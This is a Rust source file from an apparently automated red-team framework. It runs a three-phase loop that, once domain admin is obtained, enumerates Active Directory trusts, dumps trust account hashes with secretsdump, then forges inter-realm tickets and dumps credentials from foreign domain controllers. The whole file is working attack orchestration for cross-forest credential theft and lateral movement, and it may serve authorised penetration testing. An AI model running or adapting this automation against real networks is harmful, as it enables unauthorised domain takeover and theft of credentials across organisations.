//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // --- Phase 1: Auto-enumerate trusts when DA is achieved ---
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC (once per domain)
                let enum_work: Vec<(String, String, String)> = state
                    .domain_controllers
                    .iter()
                    .filter(|(domain, _)| {
                        let key = format!("trust_enum:{}", domain.to_lowercase());
                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
                    })
                    .map(|(domain, dc_ip)| {
                        let key = format!("trust_enum:{}", domain.to_lowercase());
                        (key, domain.clone(), dc_ip.clone())
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain
                    let cred = {
                        let s = dispatcher.state.read().await;
                        s.credentials
                            .iter()
                            .find(|c| {
                                !c.password.is_empty()
                                    && (c.domain.to_lowercase() == domain.to_lowercase()
                                        || domain
                                            .to_lowercase()
                                            .ends_with(&format!(".{}", c.domain.to_lowercase())))
                            })
                            .cloned()
                    };

                    if let Some(cred) = cred {
                        let payload = json!({
                            "techniques": ["enumerate_domain_trusts"],
                            "target_ip": dc_ip,
                            "domain": domain,
                            "credential": {
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            },
                        });

                        match dispatcher
                            .throttled_submit("recon", "recon", payload, 3)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    domain = %domain,
                                    "Trust enumeration dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {}
                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
                        }
                    }
                }
            }
        }

        // --- Phase 2: Extract trust keys for known cross-forest trusts ---
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                let extract_work: Vec<(String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_cross_forest())
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in the source domain (our domain, not the trust target)
                        // The trust domain is the foreign one; we need to secretsdump our DC
                        let source_domain = state.domains.first()?;
                        let dc_ip = state
                            .domain_controllers
                            .get(&source_domain.to_lowercase())
                            .cloned()?;
                        Some((key, trust.flat_name.clone(), trust.domain.clone(), dc_ip))
                    })
                    .collect();
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                if let Some(cred) = admin_cred {
                    for (key, flat_name, trust_domain, dc_ip) in extract_work {
                        // secretsdump -just-dc-user FABRIKAM$ to get trust key
                        let trust_account = format!("{}$", flat_name.to_uppercase());
                        let payload = json!({
                            "technique": "secretsdump",
                            "target_ip": dc_ip,
                            "domain": cred.domain,
                            "just_dc_user": trust_account,
                            "credential": {
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            },
                            "reason": format!("extract trust key for {}", trust_domain),
                        });

                        match dispatcher
                            .throttled_submit("credential_access", "credential_access", payload, 2)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    trust_account = %trust_account,
                                    trust_domain = %trust_domain,
                                    "Trust key extraction dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {}
                            Err(e) => {
                                warn!(err = %e, "Failed to dispatch trust key extraction")
                            }
                        }
                    }
                }
            }
        }

        // --- Phase 3: Follow trust keys (inter-realm ticket + foreign secretsdump) ---
        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            state
                .hashes
                .iter()
                .filter_map(|hash| {
                    // Trust accounts end with $ (e.g. FABRIKAM$, CHILD$)
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    let dedup_key = format!(
                        "{}:{}",
                        hash.domain.to_lowercase(),
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // The trust account name (minus $) is the target domain's
                    // NetBIOS name. Try to resolve to FQDN.
                    let target_netbios = hash.username.trim_end_matches('$');
                    let target_domain = state
                        .netbios_to_fqdn
                        .get(&target_netbios.to_uppercase())
                        .cloned()
                        .unwrap_or_else(|| target_netbios.to_lowercase());

                    // Try to find a DC for the target domain
                    let target_dc = state
                        .domain_controllers
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    // Get our domain SID for the inter-realm ticket
                    let source_domain_sid =
                        state.domain_sids.get(&hash.domain.to_lowercase()).cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        target_domain,
                        target_dc_ip: target_dc,
                        source_domain_sid,
                    })
                })
                .collect()
        };

        for item in work {
            // Synthesize a forest_trust_escalation vulnerability to track the
            // cross-forest attack path in discovered vulnerabilities.
            let vuln_id = format!(
                "forest_trust_{}_{}",
                item.hash.domain.to_lowercase(),
                item.target_domain.to_lowercase()
            );
            let trust_target = item
                .target_dc_ip
                .clone()
                .unwrap_or_else(|| item.target_domain.clone());
            {
                let mut details = std::collections::HashMap::new();
                details.insert(
                    "source_domain".into(),
                    serde_json::Value::String(item.hash.domain.clone()),
                );
                details.insert(
                    "target_domain".into(),
                    serde_json::Value::String(item.target_domain.clone()),
                );
                details.insert(
                    "trust_account".into(),
                    serde_json::Value::String(item.hash.username.clone()),
                );
                details.insert(
                    "note".into(),
                    serde_json::Value::String(format!(
                        "Forest trust escalation via {} trust key — inter-realm ticket + secretsdump",
                        item.hash.username
                    )),
                );
                let vuln = ares_core::models::VulnerabilityInfo {
                    vuln_id: vuln_id.clone(),
                    vuln_type: "forest_trust_escalation".to_string(),
                    target: trust_target,
                    discovered_by: "trust_automation".to_string(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 1,
                };
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // 1. Dispatch inter-realm ticket creation
            let mut ticket_payload = json!({
                "technique": "create_inter_realm_ticket",
                "domain": item.hash.domain,
                "target_domain": item.target_domain,
                "trust_hash": item.hash.hash_value,
                "trust_account": item.hash.username,
                "vuln_id": &vuln_id,
            });
            if let Some(ref sid) = item.source_domain_sid {
                ticket_payload["domain_sid"] = json!(sid);
            }
            if let Some(ref aes) = item.hash.aes_key {
                ticket_payload["aes_key"] = json!(aes);
            }

            match dispatcher
                .throttled_submit("exploit", "privesc", ticket_payload, 1)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        trust_account = %item.hash.username,
                        target_domain = %item.target_domain,
                        "Inter-realm ticket task dispatched"
                    );
                    // Mark trust vuln as exploited once the ticket task is dispatched
                    let _ = dispatcher
                        .state
                        .mark_exploited(&dispatcher.queue, &vuln_id)
                        .await;
                }
                Ok(None) => {
                    debug!("Inter-realm ticket deferred by throttler");
                    continue; // Don't mark as processed; try again next cycle
                }
                Err(e) => {
                    warn!(err = %e, "Failed to dispatch inter-realm ticket");
                    continue;
                }
            }

            // 2. If we know the target DC, dispatch secretsdump against it
            if let Some(ref dc_ip) = item.target_dc_ip {
                let sd_payload = json!({
                    "technique": "secretsdump",
                    "target_ip": dc_ip,
                    "domain": item.target_domain,
                    "trust_account": item.hash.username,
                    "trust_hash": item.hash.hash_value,
                });

                match dispatcher
                    .throttled_submit("credential_access", "credential_access", sd_payload, 2)
                    .await
                {
                    Ok(Some(task_id)) => {
                        info!(
                            task_id = %task_id,
                            target_dc = %dc_ip,
                            target_domain = %item.target_domain,
                            "Cross-domain secretsdump dispatched"
                        );
                    }
                    Ok(None) => {}
                    Err(e) => warn!(err = %e, "Failed to dispatch cross-domain secretsdump"),
                }
            }

            // Mark as processed
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
}
